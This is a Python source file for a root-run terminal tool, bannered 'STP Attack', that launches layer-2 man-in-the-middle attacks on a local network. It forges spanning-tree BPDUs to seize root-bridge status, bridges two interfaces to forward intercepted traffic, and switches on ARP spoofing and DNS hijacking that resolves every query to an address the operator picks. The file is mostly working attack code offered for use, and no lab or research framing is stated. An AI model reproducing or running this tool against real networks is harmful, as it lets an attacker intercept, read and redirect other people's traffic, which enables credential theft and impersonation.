import sys
import threading
import os
import netifaces
import curses
import json
import ipaddress
import create_bridge
import arp_spoof
import hijack_dns
from types import SimpleNamespace
from platform import system
from scapy.all import *
from scapy.contrib.dtp import DTP, DTPDomain, DTPStatus, DTPType, DTPNeighbor
from scapy.layers.l2 import LLC, SNAP, Dot3
from time import sleep
from typing import Optional

try:
    with open('configs/config', 'r') as f:
        config = json.load(f, object_hook=lambda c: SimpleNamespace(**c))
except FileNotFoundError:
    print("Config file not found int ./configs")
    sys.exit(1)

try:
    with open('configs/attacks', 'r') as f:
        attacks = json.load(f, object_hook=lambda atk: SimpleNamespace(**atk))
except FileNotFoundError:
    print("Attack file not found in ./configs")
    sys.exit(1)

choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if
           attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
verbose = config.verbose
stdscr: Optional[curses.window] = None  # For GUI
stop_hijack_event = threading.Event()
stop_dtp_event = threading.Event()
system_interfaces = netifaces.interfaces()
banner = r""" (           (                                          
 )\ )  *   ) )\ )     (         )    )               )  
(()/(` )  /((()/(     )\     ( /( ( /(    )       ( /(  
 /(_))( )(_))/(_)) ((((_)(   )\()))\())( /(   (   )\()) 
(_)) (_(_())(_))    )\ _ )\ (_))/(_))/ )(_))  )\ ((_)\  
/ __||_   _|| _ \   (_)_\(_)| |_ | |_ ((_)_  ((_)| |(_) 
\__ \  | |  |  _/    / _ \  |  _||  _|/ _` |/ _| | / /  
|___/  |_|  |_|     /_/ \_\  \__| \__|\__,_|\__| |_\_\  

Use Arrow keys to navigate and Enter to choose an option
"""


def hijack(event, interfaces, pkt):
    pkt[0].src = attacks.hijack.settings.mac_address
    pkt[0].rootid = 0
    pkt[0].rootmac = attacks.hijack.settings.mac_address
    pkt[0].bridgeid = 0
    pkt[0].bridgemac = attacks.hijack.settings.mac_address
    while not event.is_set():
        for interface in interfaces:
            sendp(pkt[0], loop=0, verbose=0, iface=interface)
        sleep(attacks.hijack.settings.interval)


def launch_stp_atk(interfaces):
    pkt = sniff(filter="ether dst 01:80:c2:00:00:00", count=1, iface=interfaces)
    stp_thread = threading.Thread(target=hijack, args=(stop_hijack_event, interfaces, pkt,))
    stp_thread.daemon = True
    stp_thread.start()


def enable_forwarding(bridge_name: str, interfaces: list):
    create_bridge.start(bridge_name, interfaces, verbose=verbose)


def disable_forwarding(bridge_name: str):
    create_bridge.stop(bridge_name, verbose=verbose)


def enable_arp_spoof(interfaces):
    arp_spoof.start(interfaces, verbose=verbose)


def disable_arp_spoof():
    arp_spoof.stop(verbose=verbose)


def enable_dns_hijack(fakeip, interfaces):
    hijack_dns.start(fakeip, interfaces, verbose=verbose)


def disable_dns_hijack():
    hijack_dns.stop(verbose=verbose)


def display_banner(extra=""):
    try:
        stdscr.addstr(banner + extra)
    except Exception:
        pass


def select_option(options, title):
    selection = 0
    while True:
        stdscr.clear()
        stdscr.addstr(f"{banner}\n\n{title}:\n")
        for i, option in enumerate(options):
            if i == selection:
                stdscr.addstr(f">>> {option}\n")
            else:
                stdscr.addstr(f"    {option}\n")

        c = stdscr.getch()
        if c == curses.KEY_UP and selection > 0:
            selection -= 1
        elif c == curses.KEY_DOWN and selection < len(options) - 1:
            selection += 1
        elif c == curses.KEY_ENTER or c == 10 or c == 13:  # Enter key
            stdscr.clear()
            stdscr.refresh()
            display_banner("\n")
            break

    return options[selection]


def get_user_input(prompt, type_check: tuple = (int, float, str, bool, complex)):
    stdscr.clear()
    display_banner()
    while True:
        stdscr.addstr("\n" + prompt)
        stdscr.refresh()
        curses.echo()
        user_input = stdscr.getstr().decode('utf-8')

        for t in type_check:
            try:
                # Special handling for bool because bool('False') is True
                if t is bool:
                    if user_input.lower() == 'false':
                        curses.noecho()
                        return False
                    elif user_input.lower() == 'true':
                        curses.noecho()
                        return True
                    else:
                        raise ValueError
                converted_input = t(user_input)
            except ValueError:
                continue
            else:
                # Input is of the correct type
                curses.noecho()
                return converted_input

        stdscr.addstr("\nInvalid input. Please enter a value of type(s): " + ', '.join(str(t) for t in type_check))
        stdscr.refresh()


def select_interface(n):
    stdscr.addstr(banner)
    interface = select_option(system_interfaces, f'Please choose an interface for interface {n}')
    system_interfaces.remove(interface)
    stdscr.addstr(f"\nYou selected {interface} for interface {n}. Press any key to continue\n")
    stdscr.getch()
    return interface


def replace_choice(old, new):
    choices.insert(choices.index(old), new)
    choices.remove(old)


def gui(stdscr_gui):
    display_banner(f"\n\nVersion: {config.version}\n\n\nPress any key to Start")
    stdscr_gui.getch()

    if len(system_interfaces) > 2:
        interface1 = select_interface(1)
        interface2 = select_interface(2)
        selected_interfaces = [interface1, interface2]
    elif len(system_interfaces) == 2:
        interface1 = system_interfaces[0]
        interface2 = system_interfaces[1]
        selected_interfaces = system_interfaces
    elif len(system_interfaces) == 1:
        interface1 = system_interfaces[0]
        interface2 = "No interface available - Packet forwarding cannot be enabled."
        selected_interfaces = system_interfaces
        choices.remove(attacks.forward.start)
    else:
        print("You need at least 1 network interface. Exiting...")
        sys.exit(1)

    ip1 = netifaces.ifaddresses(interface1)[netifaces.AF_INET][0]['addr']
    ip2 = netifaces.ifaddresses(interface2)[netifaces.AF_INET][0][
        'addr'] if "No interface available" not in interface2 else ""

    while True:
        display = f"Interface 1: {interface1} ({ip1})\nInterface 2: {interface2} ({ip2})\n\nChoose what to do"
        action = select_option(choices, display)

        if action == attacks.quit:
            disable_forwarding(attacks.forward.settings.bridge_name)
            return

        if action == attacks.hijack.start:
            stdscr_gui.addstr(f"\nAttempting to hijacking root bridge...\n")
            stdscr_gui.refresh()
            stop_hijack_event.clear()
            launch_stp_atk(selected_interfaces)
            replace_choice(attacks.hijack.start, attacks.hijack.stop)
            stdscr_gui.addstr(f"Hijack started. Press any key to return\n")

        elif action == attacks.hijack.stop:
            stdscr_gui.addstr(f"\nStopping root bridge hijacking...\n")
            stdscr_gui.refresh()
            stop_hijack_event.set()
            sleep(config.stop_time)
            replace_choice(attacks.hijack.stop, attacks.hijack.start)
            stdscr_gui.addstr(f"Stopped hijack. Press any key to return\n")

        elif action == attacks.forward.start:
            enable_forwarding(attacks.forward.settings.bridge_name, selected_interfaces)
            replace_choice(attacks.forward.start, attacks.forward.stop)
            stdscr_gui.addstr(f"\nEnabled packet forwarding. Press any key to return\n")

        elif action == attacks.forward.stop:
            disable_forwarding(attacks.forward.settings.bridge_name)
            replace_choice(attacks.forward.stop, attacks.forward.start)
            stdscr_gui.addstr(f"\nDisabled packet forwarding. Press any key to return\n")

        elif action == attacks.arp.start:
            enable_arp_spoof(selected_interfaces)
            replace_choice(attacks.arp.start, attacks.arp.stop)
            stdscr_gui.addstr(f"\nEnabled ARP spoofing on {', '.join(selected_interfaces)}. Press any key to return\n")

        elif action == attacks.arp.stop:
            disable_arp_spoof()
            replace_choice(attacks.arp.stop, attacks.arp.start)
            stdscr_gui.addstr(f"\nDisabled ARP spoofing. Press any key to return\n")

        elif action == attacks.dns.start:
            fakeip = get_user_input("\nWhat IP do you want to resolve DNS queries to?\nIP Address: ", (ipaddress.IPv4Address,))
            enable_dns_hijack(fakeip, selected_interfaces)
            replace_choice(attacks.dns.start, attacks.dns.stop)
            stdscr_gui.addstr(f"Enabled DNS hijacking, resolving all DNS queries to {fakeip}. Press any key to return\n")

        elif action == attacks.dns.stop:
            disable_dns_hijack()
            replace_choice(attacks.dns.stop, attacks.dns.start)
            stdscr_gui.addstr(f"\nDisabled DNS hijacking. Press any key to return\n")

        ##################################################################
        # Add more functions here
        ##################################################################

        stdscr_gui.getch()


def check_terminal_size(min_width, min_height):
    height, width = stdscr.getmaxyx()
    curses.endwin()
    if width < min_width or height < min_height:
        return False
    return True


def main():
    global stdscr
    if system() != 'Linux':
        print("This script is only supported on Linux machines.")
        sys.exit(1)
    if os.geteuid() != 0:
        print("Please run this script with root privileges (sudo)")
        sys.exit(1)

    system_interfaces.remove("lo")  # loopback interface cannot be used
    if len(system_interfaces) < 1:
        print("No network interface detected. Not possible to launch attack. ")
        sys.exit(1)
    elif len(system_interfaces) < 2:
        print("WARNING: Only 1 network interface detected (loopback cannot be used).")
        if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye",
                                                                                                              "yes"]:
            sys.exit(1)

    stdscr = curses.initscr()
    curses.cbreak()
    stdscr.keypad(True)

    if not check_terminal_size(75, 24):
        print(
            "Please make your terminal bigger to run the script.\nAt least 75 characters in length, 25 characters in height.")
        sys.exit(1)

    # Initialise curse GUI
    curses.wrapper(gui)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        try:
            disable_forwarding(config.bridge_name)
        except Exception:
            pass
    finally:
        curses.endwin()
        print("Successfully quit from program. Goodbye :)")
